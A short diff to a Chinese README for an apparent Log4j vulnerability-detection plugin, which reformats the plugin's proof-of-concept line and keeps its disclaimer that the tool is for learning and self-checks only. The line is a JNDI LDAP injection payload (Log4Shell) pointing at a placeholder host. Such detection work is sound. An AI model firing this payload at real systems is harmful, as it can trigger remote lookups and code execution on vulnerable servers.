@@ -6,8 +6,7 @@
 会收到Log4j的主机名。
 
 1. 漏洞验证的时候，对于一个log4j漏洞仅发送一次请求
-2. 插件的POC实际是：anything${jndi:ldap://<ip>:<port>/<vulDomain>}
-
+2. 插件的POC实际是：`anything${jndi:ldap://<ip>:<port>/<vulDomain>}`
 
 
 > 本工具无攻击性，仅具有漏洞探测功能，且仅供学习研究自查使用，切勿用于非法用途，由使用该工具产生的一切风险均与本人无关！
